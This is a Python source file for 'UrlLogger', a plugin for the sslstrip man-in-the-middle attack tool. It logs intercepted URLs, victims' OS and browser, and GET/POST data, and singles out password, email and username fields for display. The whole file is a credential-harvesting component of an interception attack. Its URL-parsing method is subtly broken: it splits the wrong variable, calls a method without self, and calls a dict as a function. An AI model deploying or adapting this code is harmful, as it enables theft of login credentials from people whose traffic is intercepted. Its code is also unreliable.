"""s1plugin is a extension for Moxie Marlinspike's sslstrip."""
 
__author__ = "SizeOne"
__email__  = ""
__license__= """
 
This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License as
published by the Free Software Foundation; either version 3 of the
License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but
WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
General Public License for more details.

http://sizeonedev.wordpress.com

"""
from s1plugin.S1DummyPlugin import S1DummyPlugin
from urlparse import urlparse

class S1Plugin(S1DummyPlugin):
	
	#do not show these links
	#just a few examples that i got while doing this
	blackList=["google-analytics.com","pixel.quantserve.com","googlesyndication.com",
				"yieldmanager.com","ad.z5x.net","b.scorecardresearch.com","edgesuite.net",
				"doubleclick.net","www.facebook.com/ajax/ua_callback.php?",".png",
				".jpg",".css",".js",".gif","captcha?ctoken","safebrowsing-cache.google.com",
				"safebrowsing.clients.google.com"]
	whiteList=["pass","pw","passwd","password","palavrapasse","email","mail","e-mail",
				"user","username","usr"]
	
	def __init__(self):
		self.name = "UrlLogger"
		self.author = "SizeOne"
		self.version = "1.0"
		self.s1version = ["1.0"] #only works for s1plugin ver 1.0
		self.url = "http://sizeone.net"
		self.help = "This plugin get's the urls and prints any post data"
		
	def onVisitUrl(self,client,url,postData):
		self.process(client,url,postData)
		
	def blacklisted(self,url):
		for bl in self.blackList:
			try:
				url.lower().index(bl)
				#if black listed exit
				return True
			except ValueError:
				pass
		return False
	
	def whitelisted(self,param):
		for bl in self.whiteList:
			try:
				param.lower().index(bl)
				#if black listed exit
				return True
			except ValueError:
				pass
		return False
	
	def analysePostData(self,postData):
		#check to see if anything interesting is here.......
		wl=False
		try:
			params = dict([part.split('=') for part in postData.split('&')])
			keys=params.keys()
			other="[UrlLogger] POST params: "
			for key in keys:
				if(self.whitelisted(key)):
					wl=True
					print "[UrlLogger] White List param: "+key+"="+params[key]
				else:
					other+=key+"="+params[key]+" "
			print other
		except ValueError:
			pass
		print "[UrlLogger] Original data: "+postData
		
	def analyseUrlData(self,url):
		res = urlparse(url)
		params=res[3]
		if(params!=""):
			#check to see if anything interesting is here.......
			print "[UrlLogger] Requested url: "+res.geturl()
			wl=False
			params = dict([part.split('=') for part in url[4].split('&')])
			keys=params.keys()
			other="[UrlLogger] GET params: "
			for key in keys:
				if(whitelisted(key)):
					wl=True
					print "[UrlLogger] White List param: "+key+"="+params(key)
				else:
					other+=key+"="+params(key)+" "
			print other
		else:
			print "[UrlLogger] Requested url: "+url
	
	def process(self,client,url,postData):
		#Example on how to get info from another plugin
		#we are getting information from the callbacks provided
		#by _OSFinder, the order in which plugins are loaded counts!
		if(not self.blacklisted(url)):
			#self.storeValue("key1","ohhyeah") #example on how to store value
			#print "[URLLogger] "+self.readValue("key1") #example on how to read value
			print "[URLLogger] "+self.callBack("getOS")(client)+" "+self.callBack("getBrowser")(client)
			self.analyseUrlData(url)
			if(postData!=""):
				self.analysePostData(postData)


